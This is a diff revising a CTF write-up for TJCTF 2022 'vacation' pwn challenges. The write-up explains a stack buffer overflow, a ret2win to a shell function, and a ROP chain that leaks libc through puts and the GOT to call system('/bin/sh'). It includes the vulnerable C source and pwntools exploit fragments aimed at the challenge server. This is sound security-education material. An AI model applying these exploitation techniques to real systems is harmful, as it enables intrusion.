@@ -1,10 +1,10 @@
-# TJCTF 2022: pwn/vacation-1 & 2
+# TJCTF 2022: pwn/vacation-1 and pwn/vacation-2
 
 Participant: Robert Obkircher
 
 ## TL;DR / Short Summary
 
-In the challenge `pwn/vacation-1` there is an obvious buffer overflow which can be used to return into a function `shell_land` which calls `system("/bin/sh")`.
+In the challenge `pwn/vacation-1` there is an obvious buffer overflow that can be used to return into a function `shell_land` which calls `system("/bin/sh")`.
 
 The second challenge `pwn/vacation-2` is almost identical, but without `shell_land`. The solution is to
 use return oriented programming to leak the address of libc and call `system("/bin/sh")`.
@@ -80,7 +80,7 @@ tar -xf x.tar && rm x.tar
 
 ### Source code
 
-The only difference in the c code was that `shell_land` wasn't included for `pwn/vacation2`.
+The only difference in the c files was that `shell_land` wasn't included for `pwn/vacation2`.
 
 The function `vacation` contains a buffer overflow.
 The call to `fgets(buf, 64, stdin)` writes up to 64 bytes into the 16 byte buffer `buf`.
@@ -108,7 +108,7 @@ void main() {
 
 ### Binary:
 
-`pwntools` prints the same information for both binaries. Note that canaries are disabled.
+`pwntools` prints the same information for both binaries. Note that canaries are disabled and that the code is not position independent (No PIE).
 
 ```
     Arch:     amd64-64-little
@@ -122,9 +122,11 @@ void main() {
 
 I used `cutter` to decompile the binaries. The relevant functions are `shell_land` and `vacation`.
 
-The buffer overflow in `vacation` is explained [below](vulnerabilities-exploitable-issues).
+The buffer overflow in `vacation`, which is explained [below](vulnerabilities--exploitable-issues), allows us to set the return address to `0x0040119e` inside `shell_land`.
 
-It allows us to set the return address to `0x0040119e` inside `shell_land`.
+Initially I returend to `0x00401196`, but then the exploit only worked locally.
+The reason was a segmentation fault, because `rsp` was not aligned to 16 bytes at function entry as specified by the System V ABI.
+Skipping `push rbp` in `shell_land` resolved the issue.
 
 ```
 shell_land ();
@@ -157,10 +159,10 @@ vacation ();
 
 #### vacation2
 
-In this case we don't have `shell_land`, but `main` is relevant because it gives us two primitives for return oriented programming:
+In this case we don't have `shell_land`, so `main` becomes relevant, because it gives us two primitives for return oriented programming:
 
-1. The call to `int puts(const char *s)` at `0x004011d6` can be used to print null terminated strings. The first argument `const char *s` is passed in the `rdi` register as specified by the System V ABI.
-2. Returning to the start of main is a simple way to create a loop.
+1. The call to `int puts(const char *s)` at `0x004011d6` can be used to read memory. The first argument `const char *s` is passed in the `rdi` register as specified by the System V ABI.
+2. Returning to the start of main is a simple way to create a loop that reads and evaluates multiple payloads. This is necessary because the buffer can only fit ~5 return addresses.
 
 The buffer overflow is the same as above, because `vacation` is identical except that it is located at a different offset.
 ```
@@ -203,33 +205,39 @@ int main (int argc, char **argv, char **envp);
 
 ## Vulnerabilities / Exploitable Issue(s)
 
+```c
+void vacation() {
+  char buf[16];
+  puts("Where am I going today?");
+  fgets(buf, 64, stdin);
+}
+```
+
 The vulnerability is that the function `vacation` contains a buffer overflow which allows us to overwrite the return address with data from stdin.
 When it is called the following changes are made to the stack:
 
-| rsp change | pushed value          | added by        |
-|------------|-----------------------|-----------------|
-| -8         | return address        | call vacation   |
-| -8         | previous base pointer | push rbp        |
-| -16        | char buf[16]          | sub rsp, 0x10   |
+| instruction   | pushed value           | rsp change |
+|---------------|------------------------|------------|
+| call vacation | return address         | -8         |
+| push rbp      | previous base pointer  | -8         |
+| sub rsp, 0x10 | char buf[16]           | -16        |
 
 The register `rsp` points to the top of the stack and its final value is the same as the start address of `buf`.
 
 The stack grows toward smaller addresses but arrays indices grow toward larger addresses.
-
-This means that `buf[16..24]` is the previous base pointer and `buf[24..32]` is the return address.
+Thus `buf[16..24]` is the previous base pointer and `buf[24..32]` is the return address.
 
 The statement `fgets(buf, 64, stdin);` allows us to override the return address of the current stack frame.
-In addition, we can overwrite up to 4 return addresses (31 bytes and a 0) to chain multiple calls.
+In addition, we can overwrite up to 4 additional return addresses (31 bytes and a 0) to chain multiple calls.
 
 ## Solution
 
 ### pwn/vacation1
 
-The following script opens the binary with pwntools, connects to the remote and sends one line to override the return address and a shell command to read the flag.
-
-The main problem that I had was that my exploit only worked locally.
-The reason was a segmentation fault, because `rsp` was not aligned to 16 bytes at function entry as specified by the System V ABI.
-Skipping `push rbp` in `shell_land` resolved the issue.
+The following script opens the binary with pwntools, 
+connects to the remote and sends 
+one line to override the return address 
+and another one with a shell command to read the flag.
 
 ```python
 from pwn import *
@@ -254,7 +262,7 @@ with remote("tjc.tf", 31680) as p:
 
 ### pwn/vacation2
 
-The complete script in `vacation2/x.py` contains more comments and debug print statements.
+The original script in `vacation2/x.py` contains more comments and debug print statements.
 
 This helper function sends up to 64 bytes.
 It asserts that `fgets` will copy the full content into memory without modifications.
@@ -274,15 +282,14 @@ def send_one_line(p, line):
         assert False, line
 ```
 
-The function `read_bytes_and_ret_to_main(pointer, length)` can be used to read a byte array from memory.
+Next, the function `read_bytes_and_ret_to_main(pointer, length)` can be used to read a byte array from memory.
 
 It uses the helper function `puts_addr_and_ret_to_main(addr)` to construct the rop chain.
-First `rop(rdi = p64(addr))` places `addr` on the stack and an address with the instructions `pop rdi; ret`.
+First `rop(rdi = p64(addr))` places a char pointer `addr` on the stack and some address with the instructions `pop rdi; ret` to load it into the register.
 Then we add `0x004011d6` and `0` to execute `puts; pop rbp; ret` at the end of main. 
 Finally, we return to the beginning of `main` so that we can send another line.
 
 Because `puts` stops at the null terminator we call it in a loop with different offsets until we have received at least the desired amount of bytes.
-
 
 ```python
 def puts_addr_and_ret_to_main(addr):
@@ -308,12 +315,13 @@ def read_bytes_and_ret_to_main(pointer, length):
     return value[0:length]
 ```
 
-Now that we can read arbitrary memory we can read the address of the  libc function `got.puts` from the global offset table.
-This allows us to compute the address of libc.
+Now that we can read arbitrary memory we can read the address of the libc function `puts` from the global offset table at `got.puts`.
+This allows us to compute the address of libc, which is located at a random address because of address space layout randomization (ASLR).
 
-After setting `libc.address` `pwntools` automatically updates the location of all symbols.
-We can then simply put the string `"/bin/sh\x00"` into rdi and return to `system`.
+After setting `libc.address`, `pwntools` automatically updates the location of all symbols.
+We can then simply put a pointer to the string `"/bin/sh\x00"` into rdi and return to `system`.
 To avoid segmentation faults we have to align the stack to 16 bytes by jumping directly to a `ret` instruction, which pops 8 bytes from the stack.
+For some reason this wasn't necessary in my local virtual machine.
 
 ```python
 context.binary = chall = ELF("bin/chall")
